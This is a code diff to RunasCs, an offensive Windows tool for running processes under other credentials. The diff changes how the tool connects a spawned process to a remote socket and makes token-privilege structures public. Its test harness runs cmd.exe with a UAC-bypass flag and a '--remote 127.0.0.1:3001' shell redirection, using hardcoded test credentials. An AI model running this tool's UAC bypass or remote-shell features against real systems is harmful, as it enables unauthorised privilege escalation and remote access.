@@ -7,6 +7,7 @@ using System.Net.Sockets;
 using System.Security.Principal;
 using Microsoft.Win32;
 using System.ComponentModel;
+using System.Net;
 
 public class RunasCsException : Exception
 {
@@ -254,10 +255,6 @@ public class RunasCs
     [DllImport("ws2_32.dll", SetLastError = true)]
     public static extern ushort htons(ushort hostshort);
 
-    [Obsolete]
-    [DllImport("ws2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
-    public static extern uint inet_addr(string cp);
-
     [DllImport("ws2_32.dll", CharSet = CharSet.Auto)]
     static extern Int32 WSAGetLastError();
 
@@ -321,10 +318,10 @@ public class RunasCs
 
         SOCKADDR_IN sockinfo = new SOCKADDR_IN();
         sockinfo.sin_family = (short)2;
-        sockinfo.sin_addr = inet_addr(host);
+        sockinfo.sin_addr = BitConverter.ToUInt32(((IPAddress.Parse(host)).GetAddressBytes()), 0);
         sockinfo.sin_port = (short)htons((ushort)port);
 
-        if( connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0 ) {
+        if ( connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0 ) {
             error = WSAGetLastError();
             throw new RunasCsException(String.Format("WSAConnect failed with error code: {0}", error));
         }
@@ -1393,7 +1390,7 @@ public static class AccessToken{
         SE_GROUP_LOGON_ID = 0xC0000000
     }
 
-    private struct TOKEN_PRIVILEGES {
+    public struct TOKEN_PRIVILEGES {
        public int PrivilegeCount;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst=64)]
        public LUID_AND_ATTRIBUTES [] Privileges;
@@ -1408,18 +1405,18 @@ public static class AccessToken{
     }
 
     [StructLayout(LayoutKind.Sequential, Pack = 4)]
-    private struct LUID_AND_ATTRIBUTES {
+    public struct LUID_AND_ATTRIBUTES {
        public LUID Luid;
        public UInt32 Attributes;
     }
     
     [StructLayout(LayoutKind.Sequential)]
-    private struct LUID {
+    public struct LUID {
        public UInt32 LowPart;
        public Int32 HighPart;
     }
 
-    private struct TOKEN_ELEVATION {
+    public struct TOKEN_ELEVATION {
         public UInt32 TokenIsElevated;
     }
 
@@ -1925,19 +1922,20 @@ class MainClass
         argsTest[0] = "temp2";
         argsTest[1] = "pwd";
         argsTest[2] = "cmd.exe";
-        argsTest[2] = "C:\\Windows\\system32\\whoami /all";
+        //argsTest[2] = "C:\\Windows\\system32\\whoami /all";
         //argsTest[2] = "cmd /c C:\\Windows\\system32\\ping.exe -n 120 127.0.0.1";
         //argsTest[2] = "cmd.exe /c echo i was here && ping.exe -n 30 127.0.0.1 > C:\\Windows\\mediumil.txt";
         argsTest[3] = "--function";
         argsTest[4] = "2";
         argsTest[5] = "--logon-type";
         argsTest[6] = "8";
-        argsTest[7] = "--remote-impersonation";
-        argsTest[8] = "-t";
-        argsTest[9] = "0";
+        //argsTest[7] = "--remote-impersonation";
         //argsTest[7] = "--create-profile";
-        //argsTest[8] = "--remote";
-        //argsTest[9] = "127.0.0.1:3001";
+        argsTest[7] = "--bypass-uac";
+        //argsTest[8] = "-t";
+        //argsTest[9] = "0";
+        argsTest[8] = "--remote";
+        argsTest[9] = "127.0.0.1:3001";
         Console.Out.Write(RunasCsMainClass.RunasCsMain(argsTest));
     }
 }
